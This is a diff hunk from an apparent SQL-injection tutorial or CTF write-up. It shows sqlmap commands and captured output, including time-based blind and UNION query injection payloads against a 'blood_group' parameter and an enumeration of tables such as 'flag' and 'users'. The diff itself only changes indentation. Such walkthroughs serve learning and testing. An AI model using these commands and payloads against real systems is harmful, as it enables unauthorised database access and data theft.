@@ -295,34 +295,34 @@ Using GET based Method:
     - sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
     - sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
 
-            n@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
-            [19:35:57] [INFO] parsing HTTP request from 'req.txt'
-            [19:35:57] [INFO] resuming back-end DBMS 'mysql'
-            [19:35:57] [INFO] testing connection to the target URL
-            sqlmap resumed the following injection point(s) from stored session:
-            ---
-            Parameter: blood_group (POST)
-                Type: time-based blind
-                Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-                Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj
+     n@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
+     [19:35:57] [INFO] parsing HTTP request from 'req.txt'
+     [19:35:57] [INFO] resuming back-end DBMS 'mysql'
+     [19:35:57] [INFO] testing connection to the target URL
+     sqlmap resumed the following injection point(s) from stored session:
+     ---
+     Parameter: blood_group (POST)
+          Type: time-based blind
+          Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+          Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj
 
-                Type: UNION query
-                Title: Generic UNION query (NULL) - 8 columns
-                Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
+          Type: UNION query
+          Title: Generic UNION query (NULL) - 8 columns
+          Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
             ---
-            [19:35:58] [INFO] the back-end DBMS is MySQL
-            web server operating system: Linux Ubuntu
-            web application technology: Nginx 1.10.3
-            back-end DBMS: MySQL >= 5.0.12
-            [19:35:58] [INFO] fetching tables for database: 'blood'
-            [19:35:58] [WARNING] reflective value(s) found and filtering out
-            Database: blood
-            [3 tables]
-            +----------+
-            | blood_db |
-            | flag     |
-            | users    |
-            +----------+
+      [19:35:58] [INFO] the back-end DBMS is MySQL
+      web server operating system: Linux Ubuntu
+      web application technology: Nginx 1.10.3
+      back-end DBMS: MySQL >= 5.0.12
+      [19:35:58] [INFO] fetching tables for database: 'blood'
+      [19:35:58] [WARNING] reflective value(s) found and filtering out
+      Database: blood
+      [3 tables]
+      +----------+
+      | blood_db |
+      | flag     |
+      | users    |
+      +----------+
 
 
 Or we can simply dump all the available database and tables using the follwing commands.
